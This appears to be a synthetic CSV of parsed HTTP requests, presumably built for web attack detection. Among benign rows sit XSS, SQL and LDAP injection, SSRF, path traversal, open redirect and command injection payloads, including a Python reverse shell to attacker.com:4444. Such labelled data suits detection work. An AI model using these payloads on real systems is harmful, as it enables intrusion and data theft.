source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
192.168.1.82,2026-04-07T07:48:26.579076,http://admin.example.com/api/message?query=<math><maction,http,admin.example.com,,80,/api/message,api;message,2,query=%3Cmath%3E%3Cmaction,query=<math><maction,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.65,2026-04-07T07:48:26.580055,http://10.0.0.50/api/v2/data,http,10.0.0.50,,80,/api/v2/data,api;v2;data,3,,,0,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.156,2026-04-07T07:48:26.580055,http://admin.example.com/settings,http,admin.example.com,,80,/settings,settings,1,,,0,,,HEAD,,curl/8.4.0,,pcap
10.0.0.38,2026-04-07T07:48:26.580055,https://api.example.com/images/logo.png?page=1&brand=apple&category=electronics,https,api.example.com,,443,/images/logo.png,images;logo.png,2,page=1&brand=apple&category=electronics,page=1;brand=apple;category=electronics,3,,png,GET,,curl/8.4.0,,pcap
172.16.0.226,2026-04-07T07:48:26.581033,http://192.168.1.100/images/logo.png?format=json,http,192.168.1.100,,80,/images/logo.png,images;logo.png,2,format=json,format=json,1,,png,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.166,2026-04-07T07:48:26.581033,http://192.168.1.100/fetch?url=http%3A%2F%2Fmetadata.google.internal%2F,http,192.168.1.100,,80,/fetch,fetch,1,url=http%3A%2F%2Fmetadata.google.internal%2F,url=http://metadata.google.internal/,1,,,GET,,ZAP/2.14.0,,pcap
10.0.0.84,2026-04-07T07:48:26.582014,http://secure.example.com/events,http,secure.example.com,,80,/events,events,1,,,0,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.230,2026-04-07T07:48:26.582014,https://shop.example.com/feedback?comment=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,https,shop.example.com,,443,/feedback,feedback,1,comment=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,"comment=<math><maction actiontype=""statusline#http://attacker.com"">",1,,,GET,,wfuzz/3.1.0,,pcap
10.0.0.191,2026-04-07T07:48:26.582986,https://shop.example.com/settings?brand=apple,https,shop.example.com,,443,/settings,settings,1,brand=apple,brand=apple,1,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.67,2026-04-07T07:48:26.582986,http://admin.example.com/products?username=admin'--,http,admin.example.com,,80,/products,products,1,username=admin%27--,username=admin'--,1,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.105,2026-04-07T07:48:26.582986,http://admin.example.com/api/message?query=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,http,admin.example.com,,80,/api/message,api;message,2,query=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,"query=<video><source onerror=""alert(1)"">",1,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.181,2026-04-07T07:48:26.583994,http://admin.example.com/api/message?comment=<input,http,admin.example.com,,80,/api/message,api;message,2,comment=%3Cinput,comment=<input,1,,,POST,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.126,2026-04-07T07:48:26.584552,http://shop.example.com/ping?exec=test%3B%20ls%20-la,http,shop.example.com,,80,/ping,ping,1,exec=test%3B%20ls%20-la,exec=test; ls -la,1,,,POST,,python-requests/2.31.0,,pcap
192.168.1.138,2026-04-07T07:48:26.584552,http://webapp.internal/ping?ip=test%7C%20rev%20%2Fetc%2Fpasswd,http,webapp.internal,,80,/ping,ping,1,ip=test%7C%20rev%20%2Fetc%2Fpasswd,ip=test| rev /etc/passwd,1,,,POST,,nuclei,,pcap
172.16.0.162,2026-04-07T07:48:26.585541,https://secure.example.com/cart,https,secure.example.com,,443,/cart,cart,1,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.39,2026-04-07T07:48:26.585541,http://10.0.0.50/contact?user=john&format=json,http,10.0.0.50,,80,/contact,contact,1,user=john&format=json,user=john;format=json,2,,,GET,,curl/8.4.0,,pcap
172.16.0.138,2026-04-07T07:48:26.585541,http://example.com/api/fetch?uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http,example.com,,80,/api/fetch,api;fetch,2,uri=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,uri=http://[::1]/admin,1,,,GET,,wfuzz/3.1.0,,pcap
192.168.1.155,2026-04-07T07:48:26.585541,http://example.com/index.html?id=123,http,example.com,,80,/index.html,index.html,1,id=123,id=123,1,,html,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.163,2026-04-07T07:48:26.585541,https://shop.example.com/profile?view=list&category=electronics,https,shop.example.com,,443,/profile,profile,1,view=list&category=electronics,view=list;category=electronics,2,,,HEAD,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.115,2026-04-07T07:48:26.587045,https://example.com/products?id=',https,example.com,,443,/products,products,1,id=%27,id=',1,,,GET,,PostmanRuntime/7.35.0,,pcap
172.16.0.96,2026-04-07T07:48:26.587045,http://example.com/api/execute?exec=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,http,example.com,,80,/api/execute,api;execute,2,exec=test%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22attacker.com%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27,"exec=test; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1,,,GET,,nikto/2.5.0,,pcap
10.0.0.53,2026-04-07T07:48:26.587045,http://test-app.local/login?q=1',http,test-app.local,,80,/login,login,1,q=1%27,q=1',1,,,POST,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.187,2026-04-07T07:48:26.588029,http://api.example.com/help,http,api.example.com,,80,/help,help,1,,,0,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.223,2026-04-07T07:48:26.588029,http://admin.example.com/checkout,http,admin.example.com,,80,/checkout,checkout,1,,,0,,,POST,,PostmanRuntime/7.35.0,,pcap
10.0.0.97,2026-04-07T07:48:26.588029,http://shop.example.com/logout?view=list&page=1&id=123,http,shop.example.com,,80,/logout,logout,1,view=list&page=1&id=123,view=list;page=1;id=123,3,,,HEAD,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.183,2026-04-07T07:48:26.589081,https://webapp.internal/index.html?filter=recent,https,webapp.internal,,443,/index.html,index.html,1,filter=recent,filter=recent,1,,html,GET,,PostmanRuntime/7.35.0,,pcap
192.168.1.149,2026-04-07T07:48:26.589081,http://secure.example.com/search?username=',http,secure.example.com,,80,/search,search,1,username=%27,username=',1,,,GET,,masscan/1.3,,pcap
10.0.0.95,2026-04-07T07:48:26.589081,http://shop.example.com/api/fetch?dest=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http,shop.example.com,,80,/api/fetch,api;fetch,2,dest=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,dest=http://[::1]/admin,1,,,GET,,ZAP/2.14.0,,pcap
10.0.0.171,2026-04-07T07:48:26.590154,http://example.com/download/..;/..;/..;/etc/passwd,http,example.com,,80,/download/..;/..;/..;/etc/passwd,download;..;;..;;..;;etc;passwd,6,,,0,,,GET,,burpsuite,,pcap
10.0.0.74,2026-04-07T07:48:26.590154,http://shop.example.com/search?q=',http,shop.example.com,,80,/search,search,1,q=%27,q=',1,,,GET,,nuclei,,pcap
172.16.0.72,2026-04-07T07:48:26.590154,https://10.0.0.50/notifications?category=electronics&type=product&to=2024-12-31,https,10.0.0.50,,443,/notifications,notifications,1,category=electronics&type=product&to=2024-12-31,category=electronics;type=product;to=2024-12-31,3,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.20,2026-04-07T07:48:26.591128,https://secure.example.com/cart?limit=10&sort=asc&filter=recent,https,secure.example.com,,443,/cart,cart,1,limit=10&sort=asc&filter=recent,limit=10;sort=asc;filter=recent,3,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.39,2026-04-07T07:48:26.591128,http://test-app.local/checkout,http,test-app.local,,80,/checkout,checkout,1,,,0,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.252,2026-04-07T07:48:26.591128,http://example.com/download/..0x2f..0x2f..0x2fetc/passwd,http,example.com,,80,/download/..0x2f..0x2f..0x2fetc/passwd,download;..0x2f..0x2f..0x2fetc;passwd,3,,,0,,,GET,,python-requests/2.31.0,,pcap
192.168.1.78,2026-04-07T07:48:26.591128,http://192.168.1.100/lookup?run=test$(cat,http,192.168.1.100,,80,/lookup,lookup,1,run=test%24%28cat,run=test$(cat,1,,,GET,,wfuzz/3.1.0,,pcap
192.168.1.202,2026-04-07T07:48:26.592108,http://10.0.0.50/api/v1/health?brand=apple&filter=recent&user=john,http,10.0.0.50,,80,/api/v1/health,api;v1;health,3,brand=apple&filter=recent&user=john,brand=apple;filter=recent;user=john,3,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.187,2026-04-07T07:48:26.592108,http://api.example.com/api/execute?run=test&&,http,api.example.com,,80,/api/execute,api;execute,2,run=test,run=test,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.193,2026-04-07T07:48:26.592108,http://secure.example.com/profile?input=%3Cmarquee%20onstart%3Dalert%281%29%3E,http,secure.example.com,,80,/profile,profile,1,input=%3Cmarquee%20onstart%3Dalert%281%29%3E,input=<marquee onstart=alert(1)>,1,,,POST,,dirbuster,,pcap
192.168.1.224,2026-04-07T07:48:26.593082,http://shop.example.com/css/style.css?q=laptop&id=123,http,shop.example.com,,80,/css/style.css,css;style.css,2,q=laptop&id=123,q=laptop;id=123,2,,css,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.92,2026-04-07T07:48:26.593082,http://shop.example.com/api/message?message=<div,http,shop.example.com,,80,/api/message,api;message,2,message=%3Cdiv,message=<div,1,,,POST,,gobuster/3.6,,pcap
172.16.0.157,2026-04-07T07:48:26.593082,http://shop.example.com/search?order=',http,shop.example.com,,80,/search,search,1,order=%27,order=',1,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.210,2026-04-07T07:48:26.594091,http://shop.example.com/comment?name=%3Cimg%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,http,shop.example.com,,80,/comment,comment,1,name=%3Cimg%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,"name=<img src=""javascript:alert('XSS')"">",1,,,GET,,gobuster/3.6,,pcap
10.0.0.111,2026-04-07T07:48:26.594091,http://test-app.local/faq?limit=10,http,test-app.local,,80,/faq,faq,1,limit=10,limit=10,1,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.103,2026-04-07T07:48:26.595074,http://example.com/search?page=1,http,example.com,,80,/search,search,1,page=1,page=1,1,,,GET,,curl/8.4.0,,pcap
10.0.0.7,2026-04-07T07:48:26.595074,https://10.0.0.50/news,https,10.0.0.50,,443,/news,news,1,,,0,,,GET,,PostmanRuntime/7.35.0,,pcap
192.168.1.50,2026-04-07T07:48:26.596054,https://admin.example.com/?view=list,https,admin.example.com,,443,/,,0,view=list,view=list,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.241,2026-04-07T07:48:26.596054,http://api.example.com/api/message?input=<div,http,api.example.com,,80,/api/message,api;message,2,input=%3Cdiv,input=<div,1,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.135,2026-04-07T07:48:26.596054,https://api.example.com/events,https,api.example.com,,443,/events,events,1,,,0,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.5,2026-04-07T07:48:26.597059,https://secure.example.com/terms,https,secure.example.com,,443,/terms,terms,1,,,0,,,HEAD,,PostmanRuntime/7.35.0,,pcap
10.0.0.184,2026-04-07T07:48:26.597059,http://shop.example.com/dashboard,http,shop.example.com,,80,/dashboard,dashboard,1,,,0,,,HEAD,,python-requests/2.31.0,,pcap
172.16.0.233,2026-04-07T07:48:26.597059,http://192.168.1.100/dashboard?lang=en&q=laptop,http,192.168.1.100,,80,/dashboard,dashboard,1,lang=en&q=laptop,lang=en;q=laptop,2,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.59,2026-04-07T07:48:26.598044,https://10.0.0.50/checkout?format=json&page=1&type=product,https,10.0.0.50,,443,/checkout,checkout,1,format=json&page=1&type=product,format=json;page=1;type=product,3,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.99,2026-04-07T07:48:26.598044,https://shop.example.com/cart,https,shop.example.com,,443,/cart,cart,1,,,0,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.168,2026-04-07T07:48:26.598044,http://shop.example.com/api/products?type=product&lang=en&q=laptop,http,shop.example.com,,80,/api/products,api;products,2,type=product&lang=en&q=laptop,type=product;lang=en;q=laptop,3,,,POST,,curl/8.4.0,,pcap
192.168.1.185,2026-04-07T07:48:26.599019,http://10.0.0.50/?order=name&id=123&brand=apple,http,10.0.0.50,,80,/,,0,order=name&id=123&brand=apple,order=name;id=123;brand=apple,3,,,POST,,python-requests/2.31.0,,pcap
10.0.0.195,2026-04-07T07:48:26.599019,http://shop.example.com/contact,http,shop.example.com,,80,/contact,contact,1,,,0,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.147,2026-04-07T07:48:26.599019,http://192.168.1.100/api/v1/health?limit=10,http,192.168.1.100,,80,/api/v1/health,api;v1;health,3,limit=10,limit=10,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.9,2026-04-07T07:48:26.600000,http://example.com/blog/category/tech,http,example.com,,80,/blog/category/tech,blog;category;tech,3,,,0,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.86,2026-04-07T07:48:26.600000,http://secure.example.com/redirect?goto=%2F%2Fevil.com,http,secure.example.com,,80,/redirect,redirect,1,goto=%2F%2Fevil.com,goto=//evil.com,1,,,GET,,gobuster/3.6,,pcap
10.0.0.116,2026-04-07T07:48:26.600000,http://10.0.0.50/blog/category/tech,http,10.0.0.50,,80,/blog/category/tech,blog;category;tech,3,,,0,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.103,2026-04-07T07:48:26.600976,https://10.0.0.50/admin?user=admin',https,10.0.0.50,,443,/admin,admin,1,user=admin%27,user=admin',1,,,POST,,wfuzz/3.1.0,,pcap
192.168.1.162,2026-04-07T07:48:26.600976,http://shop.example.com/api/user?username=admin%29%28%26%29,http,shop.example.com,,80,/api/user,api;user,2,username=admin%29%28%26%29,username=admin)(&),1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.36,2026-04-07T07:48:26.600976,http://api.example.com/ldap?uid=%2A%29%28uid%3Dadmin%29%29,http,api.example.com,,80,/ldap,ldap,1,uid=%2A%29%28uid%3Dadmin%29%29,uid=*)(uid=admin)),1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.58,2026-04-07T07:48:26.601954,http://webapp.internal/news?format=json,http,webapp.internal,,80,/news,news,1,format=json,format=json,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.112,2026-04-07T07:48:26.601954,http://example.com/register?status=active&sort=asc&category=electronics,http,example.com,,80,/register,register,1,status=active&sort=asc&category=electronics,status=active;sort=asc;category=electronics,3,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.243,2026-04-07T07:48:26.602933,http://webapp.internal/goto?url=https%3A%2F%2Fevil.com%40legitimate.com,http,webapp.internal,,80,/goto,goto,1,url=https%3A%2F%2Fevil.com%40legitimate.com,url=https://evil.com@legitimate.com,1,,,GET,,python-requests/2.31.0,,pcap
192.168.1.2,2026-04-07T07:48:26.602933,https://10.0.0.50/ldap?uid=admin%29%28%26%29,https,10.0.0.50,,443,/ldap,ldap,1,uid=admin%29%28%26%29,uid=admin)(&),1,,,GET,,dirbuster,,pcap
10.0.0.238,2026-04-07T07:48:26.602933,http://192.168.1.100/settings?order=name,http,192.168.1.100,,80,/settings,settings,1,order=name,order=name,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.100,2026-04-07T07:48:26.602933,http://api.example.com/blog/category/tech?view=list&order=name,http,api.example.com,,80,/blog/category/tech,blog;category;tech,3,view=list&order=name,view=list;order=name,2,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.111,2026-04-07T07:48:26.604441,https://webapp.internal/goto?url=http%3A%2F%2Fevil.com,https,webapp.internal,,443,/goto,goto,1,url=http%3A%2F%2Fevil.com,url=http://evil.com,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.51,2026-04-07T07:48:26.604441,http://example.com/download/....//....//....//var/www/html/config.php,http,example.com,,80,/download/..../..../..../var/www/html/config.php,download;....;....;....;var;www;html;config.php,8,,,0,,php,GET,,python-requests/2.31.0,,pcap
10.0.0.150,2026-04-07T07:48:26.604441,http://shop.example.com/api/orders?order=name,http,shop.example.com,,80,/api/orders,api;orders,2,order=name,order=name,1,,,HEAD,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.3,2026-04-07T07:48:26.605424,http://api.example.com/api/user?cn=admin%2A,http,api.example.com,,80,/api/user,api;user,2,cn=admin%2A,cn=admin*,1,,,GET,,ZAP/2.14.0,,pcap
10.0.0.148,2026-04-07T07:48:26.605424,http://192.168.1.100/blog,http,192.168.1.100,,80,/blog,blog,1,,,0,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.81,2026-04-07T07:48:26.605424,http://192.168.1.100/link?next=%2F%2F%2Fevil.com,http,192.168.1.100,,80,/link,link,1,next=%2F%2F%2Fevil.com,next=///evil.com,1,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.21,2026-04-07T07:48:26.605424,https://shop.example.com/api/execute?exec=test$(sleep,https,shop.example.com,,443,/api/execute,api;execute,2,exec=test%24%28sleep,exec=test$(sleep,1,,,GET,,ZAP/2.14.0,,pcap
172.16.0.208,2026-04-07T07:48:26.605424,http://secure.example.com/ldap?uid=%2A%29%28objectClass%3D%2A,http,secure.example.com,,80,/ldap,ldap,1,uid=%2A%29%28objectClass%3D%2A,uid=*)(objectClass=*,1,,,GET,,nuclei,,pcap
10.0.0.105,2026-04-07T07:48:26.606928,http://10.0.0.50/search,http,10.0.0.50,,80,/search,search,1,,,0,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.138,2026-04-07T07:48:26.606928,http://10.0.0.50/css/style.css?brand=apple,http,10.0.0.50,,80,/css/style.css,css;style.css,2,brand=apple,brand=apple,1,,css,POST,,curl/8.4.0,,pcap
10.0.0.238,2026-04-07T07:48:26.606928,http://secure.example.com/js/main.js?brand=apple&view=list&lang=en,http,secure.example.com,,80,/js/main.js,js;main.js,2,brand=apple&view=list&lang=en,brand=apple;view=list;lang=en,3,,js,HEAD,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.129,2026-04-07T07:48:26.607910,http://example.com/api/users?order=name&view=list&category=electronics,http,example.com,,80,/api/users,api;users,2,order=name&view=list&category=electronics,order=name;view=list;category=electronics,3,,,POST,,curl/8.4.0,,pcap
172.16.0.80,2026-04-07T07:48:26.607910,https://example.com/url?url=%2F%2Fevil.com%2Fpath,https,example.com,,443,/url,url,1,url=%2F%2Fevil.com%2Fpath,url=//evil.com/path,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.249,2026-04-07T07:48:26.607910,http://secure.example.com/contact,http,secure.example.com,,80,/contact,contact,1,,,0,,,GET,,curl/8.4.0,,pcap
172.16.0.83,2026-04-07T07:48:26.608888,https://webapp.internal/api/user?cn=%2A%28%29%7C%2526%27,https,webapp.internal,,443,/api/user,api;user,2,cn=%2A%28%29%7C%26%27,cn=*()|&',1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.127,2026-04-07T07:48:26.608888,http://test-app.local/events,http,test-app.local,,80,/events,events,1,,,0,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.30,2026-04-07T07:48:26.609872,https://test-app.local/search?name=<a,https,test-app.local,,443,/search,search,1,name=%3Ca,name=<a,1,,,GET,,gobuster/3.6,,pcap
10.0.0.57,2026-04-07T07:48:26.609872,https://10.0.0.50/privacy?lang=en&id=123,https,10.0.0.50,,443,/privacy,privacy,1,lang=en&id=123,lang=en;id=123,2,,,GET,,curl/8.4.0,,pcap
10.0.0.34,2026-04-07T07:48:26.609872,http://secure.example.com/register?lang=en&view=list&category=electronics,http,secure.example.com,,80,/register,register,1,lang=en&view=list&category=electronics,lang=en;view=list;category=electronics,3,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.18,2026-04-07T07:48:26.610846,http://admin.example.com/api/v1/status,http,admin.example.com,,80,/api/v1/status,api;v1;status,3,,,0,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.236,2026-04-07T07:48:26.610846,http://webapp.internal/profile?message=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,http,webapp.internal,,80,/profile,profile,1,message=%3Cmath%3E%3Cmaction%20actiontype%3D%22statusline%23http%3A%2F%2Fattacker.com%22%3E,"message=<math><maction actiontype=""statusline#http://attacker.com"">",1,,,GET,,gobuster/3.6,,pcap
10.0.0.157,2026-04-07T07:48:26.610846,https://api.example.com/api/fetch?fetch=dict%3A%2F%2Flocalhost%3A11211%2Fstat,https,api.example.com,,443,/api/fetch,api;fetch,2,fetch=dict%3A%2F%2Flocalhost%3A11211%2Fstat,fetch=dict://localhost:11211/stat,1,,,GET,,sqlmap/1.7.12#dev,,pcap
192.168.1.57,2026-04-07T07:48:26.611822,https://shop.example.com/blog/category/tech,https,shop.example.com,,443,/blog/category/tech,blog;category;tech,3,,,0,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.170,2026-04-07T07:48:26.611822,http://webapp.internal/search?search=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,http,webapp.internal,,80,/search,search,1,search=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,search=<img src=1 onerror=alert(1)>,1,,,POST,,Nmap Scripting Engine,,pcap
172.16.0.26,2026-04-07T07:48:26.611822,http://example.com/about,http,example.com,,80,/about,about,1,,,0,,,HEAD,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
